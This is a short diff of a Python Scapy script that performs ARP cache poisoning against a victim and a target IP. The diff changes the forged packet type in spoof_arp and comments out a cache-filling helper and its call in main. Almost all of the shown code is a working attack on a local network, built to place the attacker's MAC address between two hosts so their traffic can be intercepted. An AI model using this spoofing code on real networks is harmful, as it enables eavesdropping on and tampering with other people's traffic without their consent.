@@ -28,13 +28,13 @@ def get_own_mac_address():
 def spoof_arp(own_mac, victim_ip, target_ip):
     sendp([
         Ether() / ARP(op="who-has", hwsrc=own_mac, psrc=target_ip, pdst=victim_ip),
-        Ether() / ARP(op=ARP.is_at, hwsrc=own_mac, psrc=victim_ip, pdst=target_ip)])
+        Ether() / ARP(op="who-has", hwsrc=own_mac, psrc=victim_ip, pdst=target_ip)])
 
 
-def fill_arp_cache(own_mac, victim_ip, target_ip):
-    sendp([
-        Ether() / ARP(op="who-has", hwsrc=own_mac, psrc=oIP, pdst=victim_ip),
-        Ether() / ARP(op="who-has", hwsrc=own_mac, psrc=oIP, pdst=target_ip)])
+# def fill_arp_cache(own_mac, victim_ip, target_ip):
+#     sendp([
+#         Ether() / ARP(op="who-has", hwsrc=own_mac, psrc=oIP, pdst=victim_ip),
+#         Ether() / ARP(op="who-has", hwsrc=own_mac, psrc=oIP, pdst=target_ip)])
 
 
 def main():
@@ -43,8 +43,8 @@ def main():
     except Exception as e:
         print(e)
         sys.exit(1)
-    fill_arp_cache(attacker_mac, vIP, tIP)  # <= 1 execution
-    time.sleep(2)
+    # fill_arp_cache(attacker_mac, vIP, tIP)  # <= 1 execution
+    # time.sleep(2)
     spoof_arp(attacker_mac, vIP, tIP)
 
 
